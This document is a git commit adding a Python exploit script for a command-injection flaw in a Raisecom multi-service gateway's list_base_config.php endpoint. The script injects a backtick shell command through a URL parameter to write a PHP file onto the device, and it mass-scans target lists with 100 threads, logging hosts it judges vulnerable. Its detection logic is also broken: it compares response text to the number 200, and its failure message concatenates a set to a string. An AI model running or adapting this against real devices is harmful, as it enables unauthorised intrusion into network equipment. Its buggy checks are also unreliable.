b6148b48c610e46b5871682c109694d71431c791
wajimu-bit <3011056483@qq.com>
2024-08-04 21:09:21 +0800

    Create 瑞斯康达多业务智能网关 list_base_config 命令执行.py

---
+++ 瑞斯康达多业务智能网关 list_base_config 命令执行.py
@@ -0,0 +1,63 @@
+import requests,argparse,sys,json,re
+from multiprocessing.dummy import Pool
+from requests.packages import urllib3
+#关闭警告
+GREEN = '\033[92m'
+RESET = '\033[0m'
+urllib3.disable_warnings()
+def banner():
+    test="""
+                  _      
+                 | |     
+  _   _ _   _  __| |___  
+ | | | | | | |/ _` / __| 
+ | |_| | |_| | (_| \__ \ 
+  \__, |\__, |\__,_|___/ 
+   __/ | __/ |           
+  |___/ |___/            
+"""
+    print(test)
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="瑞斯康达多业务智能网关 list_base_config 命令执行")
+    parser.add_argument('-u','--url',dest='url',type=str,help='link')
+    parser.add_argument('-f','--file',dest='file',type=str,help='file')
+    args=parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list =[]
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp=Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+def poc(target):
+    url = target + "/vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Ftest.php%60"
+    headers ={
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'close'
+        }
+ 
+
+    try:
+        res = requests.get(url=url,verify=False,headers=headers,).text
+        if res == 200:
+              with open(r'cg.txt','a+') as f1:
+                   f1.write(f'{target}\n')
+                   print('[+++++++]'+target+'可能存在漏洞')
+        else:
+             print('[-]'+{target}+'可能不存在漏洞')
+    except:
+         print(f'[*]{target}'' is server error')
+
+if __name__ == '__main__':
+    main()
